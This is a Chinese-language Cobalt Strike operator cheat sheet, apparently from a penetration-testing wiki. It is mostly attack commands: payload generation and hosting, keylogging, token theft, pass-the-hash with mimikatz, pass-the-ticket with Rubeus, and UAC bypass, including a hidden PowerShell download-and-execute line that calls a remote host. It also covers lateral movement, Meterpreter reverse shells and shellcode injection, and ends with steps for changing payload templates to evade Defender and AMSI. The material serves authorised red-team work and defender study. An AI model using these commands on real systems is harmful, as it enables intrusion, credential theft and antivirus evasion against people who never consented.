# Cobalt Strike

### 监听器

### C2监听器

`Cobalt Strike -> 监听器 -> 添加/编辑`，然后您可以选择监听的位置，使用哪种beacon（http，dns，smb...）等等。

### Peer2Peer监听器

这些监听器的beacon不需要直接与C2通信，它们可以通过其他beacon与其通信。

`Cobalt Strike -> 监听器 -> 添加/编辑`，然后您需要选择TCP或SMB beacon。

* **TCP beacon将在所选端口设置监听器**。要连接到TCP beacon，请使用另一个beacon中的命令`connect <ip> <port>`
* **smb beacon将在具有所选名称的pipename上进行监听**。要连接到SMB beacon，您需要使用命令`link [target] [pipe]`。

### 生成和托管payloads

#### 在文件中生成payloads

`攻击 -> 包 ->`&#x20;

* **`HTMLApplication`** 用于HTA文件
* **`MS Office Macro`** 用于带有宏的办公文档
* **`Windows Executable`** 用于.exe，.dll或服务.exe
* **`Windows Executable (S)`** 用于**无阶段**的.exe，.dll或服务.exe（无阶段比有阶段更好，IoC更少）

#### 生成和托管payloads

`攻击 -> Web Drive-by -> Scripted Web Delivery (S)` 这将生成一个脚本/可执行文件，用于从cobalt strike下载beacon，格式可以是：bitsadmin，exe，powershell和python

#### 托管Payloads

如果您已经有要托管在Web服务器上的文件，只需转到`攻击 -> Web Drive-by -> Host File`，然后选择要托管的文件和Web服务器配置。

### Beacon选项

<pre class="language-bash"><code class="lang-bash"># 执行本地.NET二进制文件
execute-assembly &#x3C;/path/to/executable.exe>

# 截屏
printscreen    # 通过PrintScr方法拍摄单个截屏
screenshot     # 拍摄单个截屏
screenwatch    # 定期拍摄桌面截屏
## 转到View -> Screenshots查看它们

# 键盘记录器
keylogger [pid] [x86|x64]
## 查看 > Keystrokes以查看按下的键

# 端口扫描
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 在另一个进程中注入端口扫描操作
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# 导入Powershell模块
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;在此处编写Powershell命令>

# 用户模拟
## 使用凭据生成令牌
make_token [DOMAIN\user] [password] #创建用于模拟网络中的用户的令牌
ls \\computer_name\c$ #尝试使用生成的令牌访问计算机中的C$
rev2self #停止使用通过make_token生成的令牌
## 使用make_token会生成事件4624：成功登录了一个帐户。这个事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，这是类型9。

# UAC绕过
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## 从pid中窃取令牌
## 类似于make_token，但是从进程中窃取令牌
steal_token [pid] #此外，这对于网络操作非常有用，而不是本地操作
## 从API文档中我们知道，这个登录类型“允许调用者克隆其当前令牌”。这就是为什么Beacon输出显示Impersonated &#x3C;current_username> - 它正在模拟我们自己的克隆令牌。
ls \\computer_name\c$ #尝试使用生成的令牌访问计算机中的C$
rev2self #停止使用从steal_token窃取的令牌

## 以新凭据启动进程
spawnas [domain\username] [password] [listener] #从具有读取访问权限的目录（如：cd C:\）中执行此操作
## 类似于make_token，这将生成Windows事件4624：成功登录了一个帐户，但登录类型为2（LOGON32_LOGON_INTERACTIVE）。它将详细说明调用用户（TargetUserName）和模拟用户（TargetOutboundUserName）。

## 注入进程
inject [pid] [x64|x86] [listener]
## 从OpSec的角度来看：除非确实有必要（例如x86 -> x64或x64 -> x86），否则不要执行跨平台注入。

## 传递哈希
## 此修改过程需要对LSASS内存进行修补，这是一项高风险操作，需要本地管理员权限，并且如果启用了受保护的进程轻量级（PPL），则不太可行。
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## 通过mimikatz传递哈希
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## 没有/run，mimikatz会生成一个cmd.exe，如果您以桌面用户身份运行，他将看到shell（如果您以SYSTEM身份运行，则可以正常运行）
steal_token &#x3C;pid> #从mimikatz创建的进程中窃取令牌

## 传递票据
## 请求一个票据
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## 创建一个新的登录会话以使用新的票据（以不覆盖受损的票据）
make_token &#x3C;domain>\&#x3C;username> DummyPass
## 将票据写入攻击者机器的powershell会话中并加载它
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
## 从SYSTEM传递票据
## 使用票据生成新进程
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;用户名> /domain:&#x3C;域名> /aes256:&#x3C;AES密钥> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## 从该进程中窃取令牌
steal_token &#x3C;pid>

## 提取票据 + 传递票据
### 列出票据
execute-assembly C:\path\Rubeus.exe triage
### 通过luid转储有趣的票据
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### 创建新的登录会话，注意luid和进程ID
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 在生成的登录会话中插入票据
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 最后，从该新进程中窃取令牌
steal_token &#x3C;pid>

# 横向移动
## 如果创建了令牌，将使用它
jump [方法] [目标] [监听器]
## 方法：
## psexec                    x86   使用服务运行服务EXE文件
## psexec64                  x64   使用服务运行服务EXE文件
## psexec_psh                x86   使用服务运行PowerShell一行命令
## winrm                     x86   通过WinRM运行PowerShell脚本
## winrm64                   x64   通过WinRM运行PowerShell脚本

remote-exec [方法] [目标] [命令]
## 方法：
<strong>## psexec                          通过服务控制管理器远程执行
</strong>## winrm                           通过WinRM远程执行（PowerShell）
## wmi                             通过WMI远程执行

## 要使用wmi执行beacon（不在jump命令中），只需上传beacon并执行它
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# 将会话传递给Metasploit - 通过监听器
## 在Metasploit主机上
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## 在cobalt中：Listeners > Add并将Payload设置为Foreign HTTP。将Host设置为10.10.5.120，将Port设置为8080，然后点击Save。
beacon> spawn metasploit
## 只能使用外部监听器生成x86 Meterpreter会话。

# 将会话传递给Metasploit - 通过shellcode注入
## 在Metasploit主机上
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## 运行msfvenom并准备multi/handler监听器

## 将bin文件复制到cobalt strike主机
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #在x64进程中注入metasploit shellcode

# 将metasploit会话传递给cobalt strike
## 生成无阶段的Beacon shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，将Output type设置为Raw，选择Use x64 payload。
## 在metasploit中使用post/windows/manage/shellcode_inject将生成的cobalt strike shellcode注入

# 枢纽
## 在teamserver中打开socks代理
beacon> socks 1080

# SSH连接
beacon> ssh 10.10.17.12:22 用户名 密码</code></pre>

## 避免杀毒软件

### Artifact Kit

通常在`/opt/cobaltstrike/artifact-kit`中，您可以找到cobalt strike将用于生成二进制beacon的代码和预编译模板（在`/src-common`中）。

使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)与生成的后门（或仅与编译的模板）一起，您可以找到是什么触发了防御者。通常是一个字符串。因此，您只需修改生成后门的代码，使该字符串不出现在最终的二进制文件中。

修改代码后，只需从同一目录运行`./build.sh`，然后将`dist-pipe/`文件夹复制到Windows客户端的`C:\Tools\cobaltstrike\ArtifactKit`中。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
不要忘记加载`dist-pipe\artifact.cna`这个侵略性脚本，以指示Cobalt Strike使用我们想要的磁盘资源，而不是加载的资源。

### 资源工具包

资源工具包文件夹包含了Cobalt Strike基于脚本的载荷的模板，包括PowerShell、VBA和HTA。

使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)和这些模板，您可以找出防御者（在这种情况下是AMSI）不喜欢的内容并进行修改：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
修改检测到的行，可以生成一个不会被捕捉的模板。

不要忘记加载侵略性脚本 `ResourceKit\resources.cna`，以指示Cobalt Strike使用我们想要的磁盘资源，而不是加载的资源。
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

